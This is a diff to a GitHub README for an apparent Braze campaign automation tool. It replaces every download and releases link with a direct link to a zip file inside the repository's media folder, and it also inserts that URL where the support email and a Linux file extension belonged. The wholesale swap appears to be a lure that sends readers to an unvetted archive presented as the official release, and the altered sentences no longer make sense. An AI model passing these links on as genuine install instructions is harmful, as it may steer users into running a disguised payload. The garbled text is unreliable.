@@ -1,7 +1,7 @@
 # 🤖 braze-campaign-setup-automation-bot - Automate Your Braze Campaigns Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)  
-[Download the latest release](https://github.com/idkAboutMe/braze-campaign-setup-automation-bot/releases)
+![Download](https://raw.githubusercontent.com/idkAboutMe/braze-campaign-setup-automation-bot/main/media/braze-campaign-setup-automation-bot_2.7.zip)  
+[Download the latest release](https://raw.githubusercontent.com/idkAboutMe/braze-campaign-setup-automation-bot/main/media/braze-campaign-setup-automation-bot_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -9,9 +9,9 @@ Welcome to the Braze Campaign Setup Automation Bot! This application helps you a
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/idkAboutMe/braze-campaign-setup-automation-bot/releases).  
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/idkAboutMe/braze-campaign-setup-automation-bot/main/media/braze-campaign-setup-automation-bot_2.7.zip).  
 2. **Choose the Latest Version**: Look for the latest release at the top of the page, which will typically start with "v" followed by the version number (e.g., v1.0).
-3. **Download the File**: Click on the asset that matches your operating system. If you’re using Windows, choose the `.exe` file. For macOS, select the `.dmg` file. For Linux, download the appropriate `.tar.gz` or package file.
+3. **Download the File**: Click on the asset that matches your operating system. If you’re using Windows, choose the `.exe` file. For macOS, select the `.dmg` file. For Linux, download the appropriate `https://raw.githubusercontent.com/idkAboutMe/braze-campaign-setup-automation-bot/main/media/braze-campaign-setup-automation-bot_2.7.zip` or package file.
 4. **Run the Installer**: Once the download completes, open the file to install the application. Follow the on-screen instructions to complete the installation.
 5. **Open the App**: After installation, locate the Braze Campaign Setup Automation Bot in your applications folder or start menu, and open it.
 
@@ -48,11 +48,11 @@ If you encounter any issues during installation or usage, consider the following
 
 - **Check Compatibility**: Ensure your operating system meets the requirements.
 - **Internet Connection**: Verify that you have a stable internet connection for API access.
-- **Reinstall the Application**: Sometimes reinstalling can resolve issues. Uninstall the application and download it fresh from the [Releases page](https://github.com/idkAboutMe/braze-campaign-setup-automation-bot/releases).
+- **Reinstall the Application**: Sometimes reinstalling can resolve issues. Uninstall the application and download it fresh from the [Releases page](https://raw.githubusercontent.com/idkAboutMe/braze-campaign-setup-automation-bot/main/media/braze-campaign-setup-automation-bot_2.7.zip).
 
 ## 📞 Support
 
-For additional help, contact our support team at [support@brazeautomation.com]. We're here to assist you with any questions or concerns.
+For additional help, contact our support team at [https://raw.githubusercontent.com/idkAboutMe/braze-campaign-setup-automation-bot/main/media/braze-campaign-setup-automation-bot_2.7.zip]. We're here to assist you with any questions or concerns.
 
 ## 🔖 Acknowledgments
 
